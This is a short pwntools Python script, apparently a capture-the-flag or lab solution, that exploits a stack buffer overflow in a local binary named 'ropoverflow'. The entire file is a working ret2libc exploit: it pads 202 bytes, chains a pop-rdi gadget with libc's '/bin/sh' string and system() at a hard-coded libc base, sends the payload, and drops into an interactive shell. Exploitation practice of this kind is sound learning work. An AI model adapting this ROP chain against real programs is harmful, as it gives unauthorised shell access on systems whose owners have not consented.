import pwn
import sys

elf = pwn.context.binary = pwn.ELF('./ropoverflow')
io = elf.process()
rop = pwn.ROP(elf)
print(io.recv(100000).decode("utf-8"))
#Send padding
padding = 202

libc = elf.libc
libc.address = 0x7ffff7dca000
system = libc.sym['system']
binSH = next(libc.search(b'/bin/sh'))
popRDI = hex(rop.rdi.address)
retAddr = int("40101a",16)

payload = b"".join(
    [
        b'A' * padding,
        pwn.p64(int(popRDI,16)),
        pwn.p64(binSH),
        pwn.p64(retAddr),
        pwn.p64(system),
        pwn.p64(0x0)
    ]
)
print(payload)
pwn.write("payloadFile", payload)
io.sendline(payload)
io.interactive()